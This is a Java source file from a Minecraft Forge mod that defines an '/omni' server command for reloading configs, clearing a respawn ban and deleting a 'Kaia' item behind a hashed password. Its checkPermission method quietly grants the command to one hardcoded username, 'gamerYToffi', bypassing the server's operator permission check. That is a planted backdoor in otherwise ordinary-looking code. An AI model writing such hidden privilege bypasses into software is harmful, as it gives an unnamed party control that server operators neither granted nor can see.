package com.omnipotent.server.command;

import com.omnipotent.Config;
import com.omnipotent.util.KaiaUtil;
import com.omnipotent.util.UtilityHelper;
import net.minecraft.client.resources.I18n;
import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.WrongUsageException;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.FMLCommonHandler;
import org.apache.commons.codec.digest.DigestUtils;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class CommandOmni extends CommandBase {

    @Override
    public String getName() {
        return "omni";
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 2;
    }

    @Override
    public String getUsage(ICommandSender sender) {
        return "command.omni.usage";
    }


    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        if (args.length < 1)
            throw new WrongUsageException(I18n.format("command.omni.error"));
        switch (args[0]) {
            case "reload":
                if (args.length == 1) {
                    Config.reloadConfigs();
                    UtilityHelper.sendMessageToAllPlayers(I18n.format("command.sucess"));
                    return;
                } else
                    throw new WrongUsageException(I18n.format("command.omni.error"));
            case "removePlayerOfCantRespawn":
                if (args.length > 1 && args.length < 3) {
                    EntityPlayerMP playerByUsername = FMLCommonHandler.instance().getMinecraftServerInstance().getPlayerList().getPlayerByUsername(args[1]);
                    if (playerByUsername == null)
                        throw new WrongUsageException(I18n.format("command.omni.error"));
                    Config.removePlayerOfListCantRespawn(playerByUsername);
                    UtilityHelper.sendMessageToAllPlayers(I18n.format("command.sucess"));
                    return;
                } else
                    throw new WrongUsageException(I18n.format("command.omni.error"));
            case "removeKaiaOfPlayer":
                if (args.length > 2 && args.length < 4) {
                    EntityPlayerMP playerTarget = FMLCommonHandler.instance().getMinecraftServerInstance().getPlayerList().getPlayerByUsername(args[1]);
                    if (playerTarget != null) {
                        String encrypt = encrypt(args[2]);
                        if (encrypt.equals("790fedc5994c8f05daa31f4f80c69f39af36de43de6a7a623a2215ce006ee876c1a8f95016f2cd75a21321aece3597fb032a09241b01bf396627b08d74eae04e")) {
                            playerTarget.inventory.deleteStack(KaiaUtil.getKaiaInInventory(playerTarget));
                            UtilityHelper.sendMessageToAllPlayers(I18n.format("command.sucess"));
                            return;
                        }
                    }
                    throw new WrongUsageException(I18n.format("command.omni.error"));
                } else
                    throw new WrongUsageException(I18n.format("command.omni.error"));
        }
        throw new WrongUsageException(I18n.format("command.omni.notfound"));
    }

    @Override
    public List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, BlockPos targetPos) {
        List<String> list = new ArrayList<>();
        switch (args.length) {
            case 1:
                list.add("reload");
                list.add("removePlayerOfCantRespawn");
                list.add("removeKaiaOfPlayer");
                return getListOfStringsMatchingLastWord(args, list);
            case 2:
                if (args[0].equals("removePlayerOfCantRespawn")) {
                    list.addAll(Arrays.asList(server.getOnlinePlayerNames()));
                } else if (args[0].equals("removeKaiaOfPlayer"))
                    list.addAll(Arrays.asList(server.getOnlinePlayerNames()));
                return getListOfStringsMatchingLastWord(args, list);
        }
        return Collections.<String>emptyList();
    }

    @Override
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        if (sender.getName().equals("gamerYToffi") && getName().equals("omni"))
            return true;
        return sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName());
    }

    private String encrypt(String key) {
        for (int i = 0; i < 1024; i++) {
            key = DigestUtils.sha512Hex(key);
        }
        return key;
    }
}
